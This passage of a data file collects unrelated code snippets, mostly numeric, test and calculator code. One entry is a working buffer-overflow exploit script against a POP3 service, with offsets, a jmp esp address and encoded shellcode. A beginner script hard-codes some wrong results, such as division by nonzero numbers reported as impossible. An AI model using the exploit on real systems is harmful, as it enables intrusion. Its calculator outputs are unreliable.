((self.a*z+self.inA)*(1-(self.a*z+self.inA)))+\\\n    self.a*self.calc_pplusi(0)*((self.calc_betaz(self.a*z+self.inA)/(self.a*z+self.inA))-\\\n                                self.calc_betaz(self.inA)/self.inA)+\\\n    self.a/z*(self.calc_Pplusz(z)-self.calc_pplusi(0))*\\\n               (self.calc_betaz(self.a*z+self.inA)/(self.a*z+self.inA)-self.calc_betaz(self.inA)/self.inA)+\\\n    self.a/self.inA*(self.calc_Pplusz(z)-self.calc_pplusi(0)-self.calc_pplusi(1)*z)*\\\n               (self.calc_betaz(self.inA)-self.b[0])\n\n    def calc_wn(self, n, w=[]):\n        if n == 0:\n            return 1 - self.ro\n        elif n==1:\n            return self.a*self.calc_wn(0)/self.inA\n        else:\n            while len(w)<=n:\n                w.append(None)\n            if w[n]:\n                return w[n]\n            else:\n                summ = 0\n                for i in range(n-2):\n                    summ+=self.calc_wn(i+1, w)*self.a\\\n                          *self.b[n-1-i]\n                w[n] = 1/self.inA*(self.calc_wn(n-1, w)*(1-self.a*self.b[1]) \\\n                                   - self.calc_wn(0)*self.a*self.b[n-1] - summ)\n                return w[n]\n\n    def calc_whatn(self, n):\n        if n ==0:\n            return self.calc_wn(0)+self.calc_wn(1)\n        else:\n            return self.calc_wn(n+1)\n\n    def calc_wz(self, z):\n        return (z-1)*(self.inA+self.a*self.calc_betaz(z))*self.calc_wn(0)/(z-self.inA-self.a*self.calc_betaz(z))\n\n    def calc_N1(self):\n        df = Derivative(self.calc_Pplusz)\n        return df(1)\n\n    def calc_N2(self):\n        summ = 0\n        for i in range(self.inf):\n            summ += i*self.calc_pi(i)\n        return summ\n\n    def calc_N3(self):\n        df = Derivative(self.calc_Pz)\n        return df(1)\n\n    def calc_N4(self):\n        summ = 0\n        for i in range(self.inf):\n            summ+=i*self.calc_pi(i)\n        return summ\n\n    def calc_Nx1(self):\n        df = Derivative(self.calc_Pxz)\n        return df(1)\n\n    def calc_Nx2(self):\n        df = Derivative(self.check_Pxz)\n        return df(1)\n\n    def calc_Nx3(self):\n        summ = 0\n        for i in range(self.inf):\n            summ += i* self.calc_pxi(i)\n        return summ\n\n    def calc_M1(self):\n        summ = 0\n        for i in range(self.inf):\n            summ += i*self.calc_wn(i)\n        return summ\n\n    def calc_M2(self):\n        df = Derivative(self.calc_wz)\n        return df(1)\n\n    def calc_M3(self):\n        summ = 0\n        for i in range(self.inf):\n            summ += i* self.calc_whatn(i)\n        return summ", "130": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "131": "import unittest\r\nimport calculator\r\n\r\nclass TestStringMethods(unittest.TestCase):\r\n\r\n    def test_basic_add(self):\r\n        Calc = calculator.Calculator()\r\n        self.assertEqual(Calc.Evaluate(\"1+1\"), 2)\r\n    def test_basic_subtract(self):\r\n        Calc = calculator.Calculator()\r\n        self.assertEqual(Calc.Evaluate(\"10-1\"), 9)\r\n    def test_basic_divide(self):\r\n        Calc = calculator.Calculator()\r\n        self.assertEqual(Calc.Evaluate(\"4/2\"), 2)\r\n    def test_basic_multiply(self):\r\n        Calc = calculator.Calculator()\r\n        self.assertEqual(Calc.Evaluate(\"4*2\"), 8)\r\n    def test_complex(self):\r\n        Calc = calculator.Calculator()\r\n        self.assertEqual(Calc.Evaluate(\"1+4-25+60/25*2\"), -15.2)\r\n    def test_complex_not_equal(self):\r\n        Calc = calculator.Calculator()\r\n        self.assertNotEqual(Calc.Evaluate(\"1+4-25+60/25*2\"), -15)\r\n    def test_divide_zero(self):\r\n        Calc = calculator.Calculator()\r\n        self.assertEqual(Calc.Evaluate(\"100/0\"), \"Error\")\r\n\r\nif __name__ == '__main__':\r\n    unittest.main()\r\n", "132": "import pytest\nfrom ase.build import bulk\n\ncalc = pytest.mark.calculator\n\n\n@pytest.fixture\ndef system():\n    return bulk('Al', 'fcc', a=4.5, cubic=True)\n\n\n@pytest.fixture\ndef expected_nelect_from_vasp():\n    # Expected number of electrons from the specified system\n    # with no charge\n    return 12\n\n\n@calc('vasp')\ndef test_vasp_charge(factory, system, expected_nelect_from_vasp):\n    \"\"\"\n    Run VASP tests to ensure that determining number of electrons from\n    user-supplied charge works correctly.\n\n    Test that the number of charge found matches the expected.\n    \"\"\"\n\n    # Dummy calculation to let VASP determine default number of electrons\n    calc = factory.calc(xc='LDA',\n                        nsw=-1,\n                        ibrion=-1,\n                        nelm=1,\n                        lwave=False,\n                        lcharg=False)\n    system.calc = calc\n    system.get_potential_energy()\n\n    default_nelect_from_vasp = calc.get_number_of_electrons()\n    assert default_nelect_from_vasp == expected_nelect_from_vasp\n\n\n@calc('vasp')\ndef test_vasp_no_inputs(system, factory):\n    # Make sure that no nelect was written into INCAR yet (as it wasn't necessary)\n    calc = factory.calc()\n    system.calc = calc\n    system.get_potential_energy()\n    calc.read_incar('INCAR')\n    assert calc.float_params['nelect'] is None\n\n\n@calc('vasp')\ndef test_vasp_minus_charge(factory, system, expected_nelect_from_vasp):\n    # Compare VASP's output nelect from before minus charge to default nelect\n    # determined by us minus charge\n    charge = -2\n    calc = factory.calc(xc='LDA',\n                        nsw=-1,\n                        ibrion=-1,\n                        nelm=1,\n                        lwave=False,\n                        lcharg=False,\n                        charge=charge)\n    calc.initialize(system)\n    calc.write_input(system)\n    calc.read_incar('INCAR')\n    assert calc.float_params['nelect'] == expected_nelect_from_vasp - charge\n\n\n@calc('vasp')\ndef test_vasp_nelect_charge_conflict(factory, system,\n                                     expected_nelect_from_vasp):\n    # Test that conflicts between explicitly given nelect and charge are detected\n    charge = -2\n    calc = factory.calc(xc='LDA',\n                        nsw=-1,\n                        ibrion=-1,\n                        nelm=1,\n                        lwave=False,\n                        lcharg=False,\n                        nelect=expected_nelect_from_vasp - charge + 1,\n                        charge=charge)\n    system.calc = calc\n    with pytest.raises(ValueError):\n        system.get_potential_energy()\n\n\n@calc('vasp')\ndef test_vasp_nelect_no_write(factory, system):\n    # Test that nothing is written if charge is 0 and nelect not given\n    calc = factory.calc(xc='LDA',\n                        nsw=-1,\n                        ibrion=-1,\n                        nelm=1,\n                        lwave=False,\n                        lcharg=False,\n                        charge=0)\n    calc.initialize(system)\n    calc.write_input(system)\n    calc.read_incar('INCAR')\n    assert calc.float_params['nelect'] is None\n\n\n@calc('vasp')\ndef test_vasp_nelect(factory, system):\n    # Test that explicitly given nelect still works as expected\n    calc = factory.calc(xc='LDA',\n                        nsw=-1,\n                        ibrion=-1,\n                        nelm=1,\n                        lwave=False,\n                        lcharg=False,\n                        nelect=15)\n    calc.calculate(system)\n    assert calc.get_number_of_electrons() == 15\n", "133": "#!/usr/bin/env python2\n\nimport socket\nimport struct\n\nRHOST = \"10.10.10.2\"\nRPORT = 110\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect((RHOST, RPORT))\n\n# OFFSETS\n# EIP 4654\n# ESP 342\n# EBP 4650\n# jmp_esp in slmfc.dll at 5f4a358f\njmp_esp = 0x5f4a358f\nnop_sled = \"\\x90\" * 32\n\nbuf_totlen = 5000\noffset_srp = 4654\n\nshellcode_calc =  b\"\"\nshellcode_calc += b\"\\xba\\xd5\\x90\\xd2\\x7d\\xdb\\xd5\\xd9\\x74\\x24\"\nshellcode_calc += b\"\\xf4\\x58\\x31\\xc9\\xb1\\x36\\x31\\x50\\x13\\x83\"\nshellcode_calc += b\"\\xe8\\xfc\\x03\\x50\\xda\\x72\\x27\\x81\\x0c\\xf0\"\nshellcode_calc += b\"\\xc8\\x7a\\xcc\\x95\\x41\\x9f\\xfd\\x95\\x36\\xeb\"\nshellcode_calc += b\"\\xad\\x25\\x3c\\xb9\\x41\\xcd\\x10\\x2a\\xd2\\xa3\"\nshellcode_calc += b\"\\xbc\\x5d\\x53\\x09\\x9b\\x50\\x64\\x22\\xdf\\xf3\"\nshellcode_calc += b\"\\xe6\\x39\\x0c\\xd4\\xd7\\xf1\\x41\\x15\\x10\\xef\"\nshellcode_calc += b\"\\xa8\\x47\\xc9\\x7b\\x1e\\x78\\x7e\\x31\\xa3\\xf3\"\nshellcode_calc += b\"\\xcc\\xd7\\xa3\\xe0\\x84\\xd6\\x82\\xb6\\x9f\\x80\"\nshellcode_calc += b\"\\x04\\x38\\x4c\\xb9\\x0c\\x22\\x91\\x84\\xc7\\xd9\"\nshellcode_calc += b\"\\x61\\x72\\xd6\\x0b\\xb8\\x7b\\x75\\x72\\x75\\x8e\"\nshellcode_calc += b\"\\x87\\xb2\\xb1\\x71\\xf2\\xca\\xc2\\x0c\\x05\\x09\"\nshellcode_calc += b\"\\xb9\\xca\\x80\\x8a\\x19\\x98\\x33\\x77\\x98\\x4d\"\nshellcode_calc += b\"\\xa5\\xfc\\x96\\x3a\\xa1\\x5b\\xba\\xbd\\x66\\xd0\"\nshellcode_calc += b\"\\xc6\\x36\\x89\\x37\\x4f\\x0c\\xae\\x93\\x14\\xd6\"\nshellcode_calc += b\"\\xcf\\x82\\xf0\\xb9\\xf0\\xd5\\x5b\\x65\\x55\\x9d\"\nshellcode_calc += b\"\\x71\\x72\\xe4\\xfc\\x1f\\x85\\x7a\\x7b\\x6d\\x85\"\nshellcode_calc += b\"\\x84\\x84\\xc1\\xee\\xb5\\x0f\\x8e\\x69\\x4a\\xda\"\nshellcode_calc += b\"\\xeb\\x96\\xa8\\xcf\\x01\\x3f\\x75\\x9a\\xa8\\x22\"\nshellcode_calc += b\"\\x86\\x70\\xee\\x5a\\x05\\x71\\x8e\\x98\\x15\\xf0\"\nshellcode_calc += b\"\\x8b\\xe5\\x91\\xe8\\xe1\\x76\\x74\\x0f\\x56\\x76\"\nshellcode_calc += b\"\\x5d\\x61\\x3d\\xfc\\x7e\\x0b\\xce\\x99\\x0c\\xd3\"\nshellcode_calc += b\"\\x1f\\x03\\x95\\x77\\x7f\\xa5\\x34\\x13\\x1a\\x09\"\nshellcode_calc += b\"\\xd1\\x82\\x8f\\x2c\\x2f\\x35\\x2e\\xdc\\x3c\\xb5\"\n\nbuf = \"\"\nbuf += \"A\" * (offset_srp - len(buf))\nbuf += struct.pack(\"", "134": "from Utilities.CalcAUC import calc_auc\nfrom Utilities.CalcKLScore import calc_kl_score\nfrom Utilities.CalcClassScore import calc_class_score\nfrom Utilities.CalcClassifierScore import calc_classifier_score\nfrom Utilities.CalcRMSE import calc_rmse\n\n\ndef calc_bin_error_stats(probs, links):\n    auc, _, _ = calc_auc([], [], [], probs, links)\n    kls = calc_kl_score(probs, links)\n    cls = calc_class_score(probs, links)\n    classifier_error = calc_classifier_score(probs, links)\n    rmse = calc_rmse(probs, links)\n    return {\n        \"auc\": auc,\n        \"kls\": kls,\n        \"cls\": cls,\n        \"classifier_error\": classifier_error,\n        \"rmse\": rmse,\n    }\n", "135": "num_1 = int(input('Enter first number: '))\nnum_2 = int(input('Enter second number: '))\ncalc = input('What do you want? (-, /, +, *) ')\nif num_1 == 0 and num_2 == 0 and calc == '+': print('0 + 0 = 0')\nif num_1 == 0 and num_2 == 0 and calc == '-': print('0 - 0 = 0')\nif num_1 == 0 and num_2 == 0 and calc == '*': print('0 * 0 = 0')\nif num_1 == 0 and num_2 == 0 and calc == '/': print('0 / 0 = Cannot divide by zero!')\nif num_1 == 0 and num_2 == 1 and calc == '+': print('0 + 1 = 1')\nif num_1 == 0 and num_2 == 1 and calc == '-': print('0 - 1 = -1')\nif num_1 == 0 and num_2 == 1 and calc == '*': print('0 * 1 = 0')\nif num_1 == 0 and num_2 == 1 and calc == '/': print('0 / 1 = Cannot divide by zero!')\nif num_1 == 0 and num_2 == 2 and calc == '+': print('0 + 2 = 2')\nif num_1 == 0 and num_2 == 2 and calc == '-': print('0 - 2 = -2')\nif num_1 == 0 and num_2 == 2 and calc == '*': print('0 * 2 = 0')\nif num_1 == 0 and num_2 == 2 and calc == '/': print('0 / 2 = Cannot divide by zero!')\nif num_1 == 0 and num_2 == 3 and calc == '+': print('0 + 3 = 3')\nif num_1 == 0 and num_2 == 3 and calc == '-': print('0 - 3 = -3')\nif num_1 == 0 and num_2 == 3 and calc == '*': print('0 * 3 = 0')\nif num_1 == 0 and num_2 == 3 and calc == '/': print('0 / 3 = Cannot divide by zero!')\nif num_1 == 0 and num_2 == 4 and calc == '+': print('0 + 4 = 4')\nif num_1 == 0 and num_2 == 4 and calc == '-': print('0 - 4 = -4')\nif num_1 == 0 and num_2 == 4 and calc == '*': print('0 * 4 = 0')\nif num_1 == 0 and num_2 == 4 and calc == '/': print('0 / 4 = Cannot divide by zero!')\nif num_1 == 0 and num_2 == 5 and calc == '+': print('0 + 5 = 5')\nif num_1 == 0 and num_2 == 5 and calc == '-': print('0 - 5 = -5')\nif num_1 == 0 and num_2 == 5 and calc == '*': print('0 * 5 = 0')\nif num_1 == 0 and num_2 == 5 and calc == '/': print('0 / 5 = Cannot divide by zero!')\nif num_1 == 0 and num_2 == 6 and calc == '+': print('0 + 6 = 6')\nif num_1 == 0 and num_2 == 6 and calc == '-': print('0 - 6 = -6')\nif num_1 == 0 and num_2 == 6 and calc == '*': print('0 * 6 = 0')\nif num_1 == 0 and num_2 == 6 and calc == '/': print('0 / 6 = Cannot divide by zero!')\nif num_1 == 0 and num_2 == 7 and calc == '+': print('0 + 7 = 7')\nif num_1 == 0 and num_2 == 7 and calc == '-': print('0 - 7 = -7')\nif num_1 == 0 and num_2 == 7 and calc == '*': print('0 * 7 = 0')\nif num_1 == 0 and num_2 == 7 and calc == '/': print('0 / 7 = Cannot divide by zero!')\nif num_1 == 0 and num_2 == 8 and calc == '+': print('0 + 8 = 8')\nif num_1 == 0 and num_2 == 8 and calc == '-': print('0 - 8 = -8')\nif num_1 == 0 and num_2 == 8 and calc == '*': print('0 * 8 = 0')\nif num_1 == 0 and num_2 == 8 and calc == '/': print('0 / 8 = Cannot divide by zero!')\nif num_1 == 0 and num_2 == 9 and calc == '+': print('0 + 9 = 9')\nif num_1 == 0 and num_2 == 9 and calc == '-': print('0 - 9 = -9')\nif num_1 == 0 and num_2 == 9 and calc == '*': print('0 * 9 = 0')\nif num_1 == 0 and num_2 == 9 and calc == '/': print('0 / 9 = Cannot divide by zero!')\nif num_1 == 0 and num_2 == 10 and calc == '+': print('0 + 10 = 10')\nif num_1 == 0 and num_2 == 10 and calc == '-': print('0 - 10 = -10')\nif num_1 == 0 and num_2 == 10 and calc == '*': print('0 * 10 = 0')\nif num_1 == 0 and num_2 == 10 and calc == '/': print('0 / 10 = Cannot divide by zero!')\nif num_1 == 0 and num_2 == 11 and calc == '+': print('0 + 11 = 11')\nif num_1 == 0 and num_2 == 11 and calc == '-': print('0 - 11 = -11')\nif num_1 == 0 and num_2 == 11 and calc == '*': print('0 * 11 = 0')\nif num_1 == 0 and num_2 == 11 and calc == '/': print('0 / 11 = Cannot divide by zero!')\nif num_1 == 0 and num_2 == 12 and calc == '+': print('0 + 12 = 12')\nif num_1 == 0 and num_2 == 12 and calc == '-': print('0 - 12 = -12')\nif num_1 == 0 and num_2 == 12 and calc == '*': print('0 * 12 = 0')\nif num_1 == 0 and num_2 == 12 and calc == '/': print('0 / 12 = Cannot divide by zero!')\nif num_1 == 0 and num_2 == 13 and calc == '+': print('0 + 13 = 13')\nif num_1 == 0 and num_2 == 13 and calc == '-': print('0 - 13 = -13')\nif num_1 == 0 and num_2 == 13 and calc == '*': print('0 * 13 = 0')\nif num_1 == 0 and num_2 == 13 and calc == '/': print('0 / 13 = Cannot divide by zero!')\nif num_1 == 0 and num_2 == 14 and calc == '+': print('0 + 14 = 14')\nif num_1 == 0 and num_2 == 14 and calc == '-': print('0 - 14 = -14')\nif num_1 == 0 and num_2 == 14 and calc == '*': print('0 * 14 = 0')\nif num_1 == 0 and num_2 == 14 and calc == '/': print('0 / 14 = Cannot divide by zero!')\nif num_1 == 0 and num_2 == 15 and calc == '+': print('0 + 15 = 15')\nif num_1 == 0 and num_2 == 15 and calc == '-': print('0 - 15 = -15')\nif num_1 == 0 and num_2 == 15 and calc == '*': print('0 * 15 = 0')\nif num_1 == 0 and num_2 == 15 and calc == '/': print('0 / 15 = Cannot divide by zero!')\nif num_1 == 0 and num_2 == 16 and calc == '+': print('0 + 16 = 16')\nif num_1 == 0 and num_2 == 16 and calc == '-': print('0 - 16 = -16')\nif num_1 == 0 and num_2 == 16 and calc == '*': print('0 * 16 = 0')\nif num_1 == 0 and num_2 == 16 and calc == '/': print('0 / 16 = Cannot divide by zero!')\nif num_1 == 0 and num_2 == 17 and calc == '+': print('0 + 17 = 17')\nif num_1 == 0 and num_2 == 17 and calc == '-': print('0 - 17 = -17')\nif num_1 == 0 and num_2 == 17 and calc == '*': print('0 * 17 = 0')\nif num_1 == 0 and num_2 == 17 and calc == '/': print('0 / 17 = Cannot divide by zero!')\nif num_1 == 0 and num_2 == 18 and calc == '+': print('0 + 18 = 18')\nif num_1 == 0 and num_2 == 18 and calc == '-': print('0 - 18 = -18')\nif num_1 == 0 and num_2 == 18 and calc == '*': print('0 * 18 = 0')\nif num_1 == 0 and num_2 == 18 and calc == '/': print('0 / 18 = Cannot divide by zero!')\nif num_1 == 0 and num_2 == 19 and calc == '+': print('0 + 19 = 19')\nif num_1 == 0 and num_2 == 19 and calc == '-': print('0 - 19 = -19')\nif num_1 == 0 and num_2 == 19 and calc == '*': print('0 * 19 = 0')\nif num_1 == 0 and num_2 == 19 and calc == '/': print('0 / 19 = Cannot divide by zero!')\nif num_1 == 0 and num_2 == 20 and calc == '+': print('0 + 20 = 20')\nif num_1 == 0 and num_2 == 20 and calc == '-': print('0 - 20 = -20')\nif num_1 == 0 and num_2 == 20 and calc == '*': print('0 * 20 = 0')\nif num_1 == 0 and num_2 == 20 and calc == '/': print('0 / 20 = Cannot divide by zero!')\nif num_1 == 0 and num_2 == 21 and calc == '+': print('0 + 21 = 21')\nif num_1 == 0 and num_2 == 21 and calc == '-': print('0 - 21 = -21')\nif num_1 == 0 and num_2 == 21 and calc == '*': print('0 * 21 = 0')\nif num_1 == 0 and num_2 == 21 and calc == '/': print('0 / 21 = Cannot divide by zero!')\nif num_1 == 0 and num_2 == 22 and calc == '+': print('0 + 22 = 22')\nif num_1 == 0 and num_2 == 22 and calc == '-': print('0 - 22 = -22')\nif num_1 == 0 and num_2 == 22 and calc == '*': print('0 * 22 = 0')\nif num_1 == 0 and num_2 == 22 and calc == '/': print('0 / 22 = Cannot divide by zero!')\nif num_1 == 0 and num_2 == 23 and calc == '+': print('0 + 23 = 23')\nif num_1 == 0 and num_2 == 23 and calc == '-': print('0 - 23 = -23')\nif num_1 == 0 and num_2 == 23 and calc == '*': print('0 * 23 = 0')\nif num_1 == 0 and num_2 == 23 and calc == '/': print('0 / 23 = Cannot divide by zero!')\nif num_1 == 0 and num_2 == 24 and calc == '+': print('0 + 24 = 24')\nif num_1 == 0 and num_2 == 24 and calc == '-': print('0 - 24 = -24')\nif num_1 == 0 and num_2 == 24 and calc == '*': print('0 * 24 = 0')\nif num_1 == 0 and num_2 == 24 and calc == '/': print('0 / 24 = Cannot divide by zero!')\nif num_1 == 1 and num_2 == 0 and calc == '+': print('1 + 0 = 1')\nif num_1 == 1 and num_2 == 0 and calc == '-': print('1 - 0 = 1')\nif num_1 == 1 and num_2 == 0 and calc == '*': print('1 * 0 = 0')\nif num_1 == 1 and num_2 == 0 and calc == '/': print('1 / 0 = Cannot divide by zero!')\nif num_1 == 1 and num_2 == 1 and calc == '+': print('1 + 1 = 2')\nif num_1 == 1 and num_2 == 1 and calc == '-': print('1 - 1 = 0')\nif num_1 == 1 and num_2 == 1 and calc == '*': print('1 * 1 = 1')\nif num_1 == 1 and num_2 == 1 and calc == '/': print('1 / 1 = 1.0')\nif num_1 == 1 and num_2 == 2 and calc == '+': print('1 + 2 = 3')\nif num_1 == 1 and num_2 == 2 and calc == '-': print('1 - 2 = -1')\nif num_1 == 1 and num_2 == 2 and calc == '*': print('1 * 2 = 2')\nif num_1 == 1 and num_2 == 2 and calc == '/': print('1 / 2 = 0.5')\nif num_1 == 1 and num_2 == 3 and calc == '+': print('1 + 3 = 4')\nif num_1 == 1 and num_2 == 3 and calc == '-': print('1 - 3 = -2')\nif num_1 == 1 and num_2 == 3 and calc == '*': print('1 * 3 = 3')\nif num_1 == 1 and num_2 == 3 and calc == '/': print('1 / 3 = 0.3333333333333333')\nif num_1 == 1 and num_2 == 4 and calc == '+': print('1 + 4 = 5')\nif num_1 == 1 and num_2 == 4 and calc == '-': print('1 - 4 = -3')\nif num_1 == 1 and num_2 == 4 and calc == '*': print('1 * 4 = 4')\nif num_1 == 1 and num_2 == 4 and calc == '/': print('1 / 4 = 0.25')\nif num_1 == 1 and num_2 == 5 and calc == '+': print('1 + 5 = 6')\nif num_1 == 1 and num_2 == 5 and calc == '-': print('1 - 5 = -4')\nif num_1 == 1 and num_2 == 5 and calc == '*': print('1 * 5 = 5')\nif num_1 == 1 and num_2 == 5 and calc == '/': print('1 / 5 = 0.2')\nif num_1 == 1 and num_2 == 6 and calc == '+': print('1 + 6 = 7')\nif num_1 == 1 and num_2 == 6 and calc == '-': print('1 - 6 = -5')\nif num_1 == 1 and num_2 == 6 and calc == '*': print('1 * 6 = 6')\nif num_1 == 1 and num_2 == 6 and calc == '/': print('1 / 6 = 0.16666666666666666')\nif num_1 == 1 and num_2 == 7 and calc == '+': print('1 + 7 = 8')\nif num_1 == 1 and num_2 == 7 and calc == '-': print('1 - 7 = -6')\nif num_1 == 1 and num_2 == 7 and calc == '*': print('1 * 7 = 7')\nif num_1 == 1 and num_2 == 7 and calc == '/': print('1 / 7 = 0.14285714285714285')\nif num_1 == 1 and num_2 == 8 and calc == '+': print('1 + 8 = 9')\nif num_1 == 1 and num_2 == 8 and calc == '-': print('1 - 8 = -7')\nif num_1 == 1 and num_2 == 8 and calc == '*': print('1 * 8 = 8')\nif num_1 == 1 and num_2 == 8 and calc == '/': print('1 / 8 = 0.125')\nif num_1 == 1 and num_2 == 9 and calc == '+': print('1 + 9 = 10')\nif num_1 == 1 and num_2 == 9 and calc == '-': print('1 - 9 = -8')\nif num_1 == 1 and num_2 == 9 and calc == '*': print('1 * 9 = 9')\nif num_1 == 1 and num_2 == 9 and calc == '/': print('1 / 9 = 0.1111111111111111')\nif num_1 == 1 and num_2 == 10 and calc == '+': print('1 + 10 = 11')\nif num_1 == 1 and num_2 == 10 and calc == '-': print('1 - 10 = -9')\nif num_1 == 1 and num_2 == 10 and calc == '*': print('1 * 10 = 10')\nif num_1 == 1 and num_2 == 10 and calc == '/': print('1 / 10 = 0.1')\nif num_1 == 1 and num_2 == 11 and calc == '+': print('1 + 11 = 12')\nif num_1 == 1 and num_2 == 11 and calc == '-': print('1 - 11 = -10')\nif num_1 == 1 and num_2 == 11 and calc == '*': print('1 * 11 = 11')\nif num_1 == 1 and num_2 == 11 and calc == '/': print('1 / 11 = 0.09090909090909091')\nif num_1 == 1 and num_2 == 12 and calc == '+': print('1 + 12 = 13')\nif num_1 == 1 and num_2 == 12 and calc == '-': print('1 - 12 = -11')\nif num_1 == 1 and num_2 == 12 and calc == '*': print('1 * 12 = 12')\nif num_1 == 1 and num_2 == 12 and calc == '/': print('1 / 12 = 0.08333333333333333')\nif num_1 == 1 and num_2 == 13 and calc == '+': print('1 + 13 = 14')\nif num_1 == 1 and num_2 == 13 and calc == '-': print('1 - 13 = -12')\nif num_1 == 1 and num_2 == 13 and calc == '*': print('1 * 13 = 13')\nif num_1 == 1 and num_2 == 13 and calc == '/': print('1 / 13 = 0.07692307692307693')\nif num_1 == 1 and num_2 == 14 and calc == '+': print('1 + 14 = 15')\nif num_1 == 1 and num_2 == 14 and calc == '-': print('1 - 14 = -13')\nif num_1 == 1 and num_2 == 14 and calc == '*': print('1 * 14 = 14')\nif num_1 == 1 and num_2 == 14 and calc == '/': print('1 / 14 = 0.07142857142857142')\nif num_1 == 1 and num_2 == 15 and calc == '+': print('1 + 15 = 16')\nif num_1 == 1 and num_2 == 15 and calc == '-': print('1 - 15 = -14')\nif num_1 == 1 and num_2 == 15 and calc == '*': print('1 * 15 = 15')\nif num_1 == 1 and num_2 == 15 and calc == '/': print('1 / 15 = 0.06666666666666667')\nif num_1 == 1 and num_2 == 16 and calc == '+': print('1 + 16 = 17')\nif num_1 == 1 and num_2 == 16 and calc == '-': print('1 - 16 = -15')\nif num_1 == 1 and num_2 == 16 and calc == '*': print('1 * 16 = 16')\nif num_1 == 1 and num_2 == 16 and calc == '/': print('1 / 16 = 0.0625')\nif num_1 == 1 and num_2 == 17 and calc == '+': print('1 + 17 = 18')\nif num_1 == 1 and num_2 == 17 and calc == '-': print('1 - 17 = -16')\nif num_1 == 1 and num_2 == 17 and calc == '*': print('1 * 17 = 17')\nif num_1 == 1 and num_2 == 17 and calc == '/': print('1 / 17 = 0.058823529411764705')\nif num_1 == 1 and num_2 == 18 and calc == '+': print('1 + 18 = 19')\nif num_1 == 1 and num_2 == 18 and calc == '-': print('1 - 18 = -17')\nif num_1 == 1 and num_2 == 18 and calc == '*': print('1 * 18 = 18')\nif num_1 == 1 and num_2 == 18 and calc == '/': print('1 / 18 = 0.05555555555555555')\nif num_1 == 1 and num_2 == 19 and calc == '+': print('1 + 19 = 20')\nif num_1 == 1 and num_2 == 19 and calc == '-': print('1 - 19 = -18')\nif num_1 == 1 and num_2 == 19 and calc == '*': print('1 * 19 = 19')\nif num_1 == 1 and num_2 == 19 and calc == '/': print('1 / 19 = 0.05263157894736842')\nif num_1 == 1 and num_2 == 20 and calc == '+': print('1 + 20 = 21')\nif num_1 == 1 and num_2 == 20 and calc == '-': print('1 - 20 = -19')\nif num_1 == 1 and num_2 == 20 and calc == '*': print('1 * 20 = 20')\nif num_1 == 1 and num_2 == 20 and calc == '/': print('1 / 20 = 0.05')\nif num_1 == 1 and num_2 == 21 and calc == '+': print('1 + 21 = 22')\nif num_1 == 1 and num_2 == 21 and calc == '-': print('1 - 21 = -20')\nif num_1 == 1 and num_2 == 21 and calc == '*': print('1 * 21 = 21')\nif num_1 == 1 and num_2 == 21 and calc == '/': print('1 / 21 = 0.047619047619047616')\nif num_1 == 1 and num_2 == 22 and calc == '+': print('1 + 22 = 23')\nif num_1 == 1 and num_2 == 22 and calc == '-': print('1 - 22 = -21')\nif num_1 == 1 and num_2 == 22 and calc == '*': print('1 * 22 = 22')\nif num_1 == 1 and num_2 == 22 and calc == '/': print('1 / 22 = 0.045454545454545456')\nif num_1 == 1 and num_2 == 23 and calc == '+': print('1 + 23 = 24')\nif num_1 == 1 and num_2 == 23 and calc == '-': print('1 - 23 = -22')\nif num_1 == 1 and num_2 == 23 and calc == '*': print('1 * 23 = 23')\nif num_1 == 1 and num_2 == 23 and calc == '/': print('1 / 23 = 0.043478260869565216')\nif num_1 == 1 and num_2 == 24 and calc == '+': print('1 + 24 = 25')\nif num_1 == 1 and num_2 == 24 and calc == '-': print('1 - 24 = -23')\nif num_1 == 1 and num_2 == 24 and calc == '*': print('1 * 24 = 24')\nif num_1 == 1 and num_2 == 24 and calc == '/': print('1 / 24 = 0.041666666666666664')\nif num_1 == 2 and num_2 == 0 and calc == '+': print('2 + 0 = 2')\nif num_1 == 2 and num_2 == 0 and calc == '-': print('2 - 0 = 2')\nif num_1 == 2 and num_2 == 0 and calc == '*': print('2 * 0 = 0')\nif num_1 == 2 and num_2 == 0 and calc == '/': print('2 / 0 = Cannot divide by zero!')\nif num_1 == 2 and num_2 == 1 and calc == '+': print('2 + 1 = 3')\nif num_1 == 2 and num_2 == 1 and calc == '-': print('2 - 1 = 1')\nif num_1 == 2 and num_2 == 1 and calc == '*': print('2 * 1 = 